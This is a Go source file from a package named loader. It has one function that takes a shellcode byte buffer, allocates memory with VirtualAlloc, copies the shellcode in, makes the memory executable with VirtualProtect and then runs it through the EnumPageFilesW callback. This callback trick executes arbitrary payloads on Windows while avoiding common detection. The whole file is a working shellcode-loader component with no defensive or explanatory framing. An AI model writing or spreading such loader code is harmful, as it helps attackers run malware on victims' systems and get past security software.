package loader

import (
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func EnumPageFilesWLoad(shellcode []byte) {
	addr, _, _ := wdll.VirtualAlloc().Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		panic("0")
	}

	_, _, errRtlMoveMemory := wdll.RtlMoveMemory().Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		panic("Call to RtlMoveMemory failed!")
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtect := wdll.VirtualProtect().Call(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic("Call to VirtualProtect failed!")
	}

	_, _, errEnumPageFilesW := wdll.EnumPageFilesW().Call(
		addr,
		0,
	)
	if errEnumPageFilesW != nil {
		panic("Call to EnumPageFilesW failed!")
	}
}
